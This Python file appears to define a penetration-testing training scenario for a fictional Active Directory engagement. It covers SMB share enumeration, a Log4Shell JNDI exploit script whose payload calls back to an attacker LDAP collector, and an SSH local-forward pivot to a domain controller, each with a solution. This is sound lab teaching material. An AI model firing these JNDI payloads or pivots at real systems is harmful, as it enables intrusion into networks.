"""Chain mode: Northwind, a jump host and the domain behind it.

The second engagement, and deliberately the other half of the exam. The Wexler
chain is a single Linux web host end to end; this one is the shape most
Active Directory work actually takes: a host you can reach, a domain you
cannot, and a foothold in between.

Three stages, one story. Anonymous share enumeration on the DMZ jump host turns
up a share that should not be readable; inside it is a deployment agent whose
public proof-of-concept puts its payload in the wrong header; and from the
foothold that gives you, the domain controller's LDAP sits on an internal
subnet only the jump host can reach.

Everything targeted is fictional and runs on loopback or in namespaces crux
built (crux D7). The share layout, the Log4Shell header problem and the
forward-resolved-from-the-far-end mistake are all real.
"""

from __future__ import annotations

from ...model import Action, ChainBody, ConduitBody, MarkBody, SalvageBody
from ...model import Scenario, Stage
from ...targets._fixture import Share, SmbShares
from ...targets._hits import Requirement
from ...targets.netns import ATTACKER, Link, Probe, Service, Topology

PLAYBOOK = 'PEN-200 Playbook'

# --------------------------------------------------------------------------
# Stage 1 - sift: a share that should not be readable
# --------------------------------------------------------------------------

_STAGE1 = MarkBody(
    prompt='Anonymous share enumeration against the only host in scope you '
           'can reach. Mark every line that changes what you do next.',
    fixture=SmbShares(
        host='10.9.0.2', netbios='JUMP01', domain='northwind.local',
        shares=(
            Share('deploy$', 'Disk', 'Deployment staging', kind='lead',
                  why='A trailing `$` makes a share hidden, not protected, and '
                      'anonymous access reached it anyway. A staging share is '
                      'where deployment tooling, its configuration and its '
                      'credentials live.'),
            Share('SYSVOL', 'Disk', 'Logon server share', kind='decoy',
                  why='The right technique on the wrong host: SYSVOL is served '
                      'by a domain controller and needs an authenticated '
                      'session, and you have neither yet.'),
            Share('IPC$', 'IPC', 'Remote IPC', kind='decoy',
                  why='On every Windows host ever built. It finds names, not a '
                      'way in, and its presence here is not the finding.'),
        ),
    ),
    actions=(
        Action('Read `deploy$` and find out what is staged in it.', True,
               'A `$` on the end makes a share hidden, not protected, and '
               'anonymous access reached it anyway. A staging share is where '
               'deployment tooling, its configuration and its credentials '
               'live.'),
        Action('Search `SYSVOL` for a Groups.xml with a cpassword.',
               why='The right technique on the wrong host. `SYSVOL` is served '
                   'by a domain controller, needs an authenticated session, '
                   'and you have neither yet.'),
        Action('Use `IPC$` to RID-cycle the domain for usernames.',
               why='Worth doing later and it finds names, not a way in. '
                   '`IPC$` is on every Windows host ever built, so its '
                   'presence here is not the finding.'),
    ),
)

# --------------------------------------------------------------------------
# Stage 2 - salvage: the payload is in the wrong header
# --------------------------------------------------------------------------

_S2_BROKEN = r'''#!/usr/bin/env python3
# Northwind Deploy Agent 3.2 - unauthenticated JNDI lookup in a logged header
# (fictional target, real defect class)
import urllib.request
import urllib.error

TARGET = "{{URL}}"
COLLECTOR = "10.9.0.1:1389"
PAYLOAD = "${jndi:ldap://" + COLLECTOR + "/a}"

def main():
    req = urllib.request.Request(TARGET + "/api/deploy/status")
    # the agent logs its own header, not this one
    req.add_header("User-Agent", PAYLOAD)
    try:
        body = urllib.request.urlopen(req).read().decode()
    except urllib.error.HTTPError as e:
        body = e.read().decode()
    print("[*] response: " + body)
    print("[+] landed" if "CRUX-LANDED" in body else "[-] no")

if __name__ == "__main__":
    main()
'''

_S2_SOLUTION = _S2_BROKEN.replace('req.add_header("User-Agent", PAYLOAD)',
                                  'req.add_header("X-Deploy-Agent", PAYLOAD)')

_STAGE2 = SalvageBody(
    brief='The staging share held the agent and its configuration. The '
          'configuration shows the agent logs the **`X-Deploy-Agent`** header '
          'on every request to `/api/deploy/status`, and the version is '
          'vulnerable to a JNDI lookup. The public proof-of-concept sprays '
          'the payload at `User-Agent`, which this agent never logs. Your '
          'collector is on `10.9.0.1:1389`.',
    filename='northwind_agent.py',
    defects=('the payload is in a header the target does not log',),
    cve='CVE-2021-44228', models='Log4Shell',
    real_note=(
        'Log4Shell payloads only fire in a field the application actually '
        'passes to the logger, and which field that is differs per product. '
        'This is exactly why real Log4Shell testing sprays the string across '
        'dozens of headers and parameters at once: a proof-of-concept written '
        'for one product hits a header the next one never logs, and reports '
        'nothing while the target is fully vulnerable.'
    ),
    route='/api/deploy/status', reject_code=200,
    reject_message='status ok',
    broken=_S2_BROKEN, solution=_S2_SOLUTION,
    requirements=(
        Requirement('the status endpoint', 'route', '/api/deploy/status',
                    hint='nothing arrived at /api/deploy/status'),
        Requirement('the logged header', 'header', '${jndi:ldap://',
                    key='X-Deploy-Agent',
                    hint='no JNDI payload arrived in X-Deploy-Agent, which is '
                         'the only header this agent logs'),
        Requirement('a callback to your collector', 'header',
                    '10.9.0.1:1389', key='X-Deploy-Agent',
                    hint='the payload does not point at your collector'),
    ),
    debrief='**A payload only fires where the application looks.** The '
            'request was well formed and the agent answered normally every '
            'time, because a header it does not log is a header it does not '
            'evaluate. The fix was one header name, and finding it meant '
            'reading the configuration you pulled out of the share rather '
            'than the proof-of-concept.',
)

# --------------------------------------------------------------------------
# Stage 3 - conduit: the domain controller is behind the jump host
# --------------------------------------------------------------------------

_S3_TOPOLOGY = Topology(
    hosts=(ATTACKER, 'jump01', 'dc01'),
    links=(Link(ATTACKER, 'jump01', '10.9.0'), Link('jump01', 'dc01', '10.9.1')),
    services=(Service('dc01', '10.9.1.2', 389, 'NORTHWIND-DC-LDAP'),),
    sshd_on=('jump01',),
    negative=(Probe(ATTACKER, '10.9.1.2', 389, 'NORTHWIND',
                    'the domain controller, reached directly'),),
    probes=(Probe(ATTACKER, '127.0.0.1', 389, 'NORTHWIND-DC-LDAP',
                  'the domain controller LDAP on 127.0.0.1:389'),),
)

_S3_STARTER = r'''#!/bin/sh
# You have a shell on jump01 (10.9.0.2) and recovered an SSH key for it.
#
#   you 10.9.0.1  <-->  10.9.0.2 jump01 10.9.1.1  <-->  10.9.1.2 dc01
#
# dc01 is the domain controller. Its LDAP on 10.9.1.2:389 answers only from
# jump01. Every AD tool you own wants to talk to it.
#
# Make it answer on 127.0.0.1:389 here.

SSH="ssh -F none -i {{ASSETS}}/id -p 2222 -N -f \
  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o ExitOnForwardFailure=yes"

# this points the far end at itself
$SSH -L 389:127.0.0.1:389 pivot@10.9.0.2
'''

_S3_SOLUTION = _S3_STARTER.replace('$SSH -L 389:127.0.0.1:389',
                                   '$SSH -L 389:10.9.1.2:389')

_STAGE3 = ConduitBody(
    brief='dc01 holds the domain and its LDAP answers only from jump01, where '
          'you now have a shell. Forward it to `127.0.0.1:389` on your own '
          'box so your tooling can reach it. The script runs without an error '
          'and the port answers nothing.',
    filename='dc_tunnel.sh',
    starter=_S3_STARTER, solution=_S3_SOLUTION,
    topology=_S3_TOPOLOGY,
    debrief='**In `-L local:HOST:PORT`, the `HOST` is resolved from the far '
            'end of the tunnel, not from your machine.** Writing `127.0.0.1` '
            'there points the forward at jump01 itself, which has no LDAP, so '
            'the tunnel builds cleanly and delivers you nothing. The '
            'destination has to be the address **as jump01 sees it**: '
            '`10.9.1.2`. This is the single most common way a working forward '
            'still returns nothing, and it never reports an error, because '
            'from SSH point of view everything succeeded.',
)

# --------------------------------------------------------------------------

SCENARIOS = [
    Scenario(
        id='chain-northwind', track='chain', tier='verified', order=20,
        title='The Northwind engagement',
        waypoint='ad-nocred-enum',
        source=f'{PLAYBOOK}/14 - Common PEN-200 Attack Chains.md',
        body=ChainBody(
            brief='**Northwind Logistics, one host in scope and a domain '
                  'behind it.** This is the shape most Active Directory work '
                  'takes: something you can reach, something you cannot, and '
                  'a foothold in between. Enumerate what is exposed, turn it '
                  'into code execution, and pivot until the domain controller '
                  'answers you.',
            stages=(
                Stage('sift', _STAGE1, title='Northwind: what is exposed',
                      bridge='Recon is done.'),
                Stage('salvage', _STAGE2, title='Northwind: foothold',
                      bridge='**The `deploy$` share was readable, and it held '
                             'the Northwind Deploy Agent and its config.** '
                             'The config names the header the agent logs, and '
                             'the version is vulnerable to a JNDI lookup. The '
                             'public proof-of-concept is below and it reports '
                             'nothing.'),
                Stage('conduit', _STAGE3, title='Northwind: reach the domain',
                      needs=('ssh', 'sshd', 'ip'),
                      bridge='**You have a shell on jump01 and an SSH key for '
                             'it.** `ip addr` shows a second interface on '
                             '`10.9.1.0/24`, and `dc01` sits on it at '
                             '`10.9.1.2` running LDAP. Nothing you own can '
                             'talk to it from here. Forward it.'),
            ),
            debrief='**That is the Active Directory shape, start to finish.** '
                    'A hidden share that was not protected, a payload that '
                    'only fires where the application looks, and a forward '
                    'whose destination is resolved from the far end. None of '
                    'the three is exotic and all three are where real '
                    'engagements stall.\n\n'
                    'What you have now is what the domain half of the exam '
                    'actually starts from: a route to the directory. Every '
                    'tool you own, `ldapsearch`, BloodHound collection, '
                    'password spraying, wants that route before it can do '
                    'anything at all, which is why the pivot is not the end '
                    'of a box but the beginning of the domain.',
        ),
    ),
]
